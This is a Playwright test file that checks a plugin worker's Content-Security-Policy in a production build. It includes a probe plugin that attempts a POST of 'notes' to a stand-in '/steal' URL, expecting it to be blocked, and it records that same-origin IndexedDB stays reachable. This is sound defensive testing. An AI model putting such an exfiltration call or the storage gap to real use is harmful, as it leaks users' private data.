import { test, expect } from '@playwright/test'
import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'

// Manual verification that the plugin worker's Content-Security-Policy is real
// — the one thing a unit test genuinely cannot tell you. `next.config.mjs` sets
// PLUGIN_WORKER_CSP on `/_next/static/:path*` because `src/middleware.ts` skips
// those paths, and a worker takes its policy from its OWN response headers.
// Asserting the config says so proves nothing about what the browser enforces;
// this spec asks the browser.
//
// Underscore-prefixed so it stays out of the CI suite (it needs a PRODUCTION
// build on disk, and the header's dev variant is deliberately looser). Run:
//
//   npm run build && npx next start -p 3999        (separate shell)
//   CSP_BASE_URL=http://127.0.0.1:3999 npm run e2e:verify -- e2e/_verify_worker_csp.spec.ts
//
// It must go through `e2e:verify` (playwright.config.verify.ts): the main config's
// `testIgnore: '**/_*.spec.ts'` drops this file even when it is named on the command line.
//
// Checks, in order of what actually matters:
//   1. the worker chunk's response carries a CSP at all;
//   2. a plugin still BOOTS under it (the Blob-URL module import is allowed) —
//      the regression that a too-tight policy would cause;
//   3. `fetch()` from inside the worker is refused — the exfiltration path the
//      policy exists to close;
//   4. `indexedDB` from inside the worker still opens — NOT a pass, a standing
//      reminder that the CSP is a mitigation and the same-origin worker still
//      reaches the vault (see docs/security.md, "permissions are not a sandbox").

const BASE = process.env.CSP_BASE_URL ?? 'http://127.0.0.1:3999'

// The worker chunk's filename is content-hashed, so find it the way the build
// leaves it: the only chunk carrying the worker-side protocol strings.
function findWorkerChunk(): string | null {
  const dir = join(process.cwd(), '.next', 'static', 'chunks')
  let names: string[]
  try {
    names = readdirSync(dir).filter(n => n.endsWith('.js'))
  } catch {
    return null
  }
  for (const name of names) {
    const body = readFileSync(join(dir, name), 'utf8')
    if (body.includes('worker:ready') && body.includes('host:boot')) {
      return `/_next/static/chunks/${name}`
    }
  }
  return null
}

const PROBE_PLUGIN = `export default {
  id: 'csp-probe', name: 'CSP probe', version: '1.0.0',
  surfaces: { commands: [{ id: 'go', title: 'Go' }] },
  async onActivate() {
    try {
      await fetch('https://example.com/steal', { method: 'POST', body: 'notes' })
      self.postMessage({ type: 'probe', key: 'fetch', value: 'allowed' })
    } catch {
      self.postMessage({ type: 'probe', key: 'fetch', value: 'blocked' })
    }
    try {
      const req = indexedDB.open('keyval-store')
      req.onsuccess = () => self.postMessage({ type: 'probe', key: 'idb', value: 'open' })
      req.onerror = () => self.postMessage({ type: 'probe', key: 'idb', value: 'error' })
    } catch {
      self.postMessage({ type: 'probe', key: 'idb', value: 'threw' })
    }
  },
}`

test('the plugin worker runs under a CSP that blocks its network but not its boot', async ({ page }) => {
  const chunk = findWorkerChunk()
  test.skip(
    chunk === null,
    'No worker chunk in .next/static/chunks — run `npm run build` first (this spec needs a production build).',
  )

  // 1. the header itself
  const res = await page.request.get(`${BASE}${chunk}`)
  expect(res.status()).toBe(200)
  const csp = res.headers()['content-security-policy']
  expect(csp, 'the worker chunk must carry its own CSP').toBeTruthy()
  expect(csp).toContain("default-src 'none'")
  expect(csp).toContain('blob:')            // the plugin module is a Blob URL
  expect(csp).toContain("connect-src 'none'")

  // the document keeps its own nonce policy — two policies would be intersected
  const doc = await page.request.get(`${BASE}/`)
  expect(doc.headers()['content-security-policy']).toContain('nonce-')

  // 2-4. what the browser actually enforces inside that worker
  await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' })
  const result = await page.evaluate(
    async ([workerUrl, source]) => {
      const w = new Worker(workerUrl, { type: 'module' })
      const seen: Record<string, string | undefined> = {}
      let booted = false
      const done = new Promise<void>((resolve) => {
        w.onmessage = (e: MessageEvent) => {
          const data = e.data as { type?: string; key?: string; value?: string }
          if (data?.type === 'worker:ready') booted = true
          if (data?.type === 'probe' && data.key && data.value) seen[data.key] = data.value
          if (seen.fetch && seen.idb) resolve()
        }
        setTimeout(() => resolve(), 15_000)
      })
      w.postMessage({ type: 'host:boot', seq: 1, pluginId: 'csp-probe', source })
      await done
      w.terminate()
      return { booted, fetch: seen.fetch, idb: seen.idb }
    },
    [chunk as string, PROBE_PLUGIN] as const,
  )

  expect(result.booted, 'a plugin must still boot — blob: import allowed').toBe(true)
  expect(result.fetch, 'fetch() from inside the worker must be refused').toBe('blocked')
  // Not a security assertion: this documents the hole the CSP does NOT close.
  expect(result.idb, 'same-origin IndexedDB is still reachable — see docs/security.md').toBe('open')
})
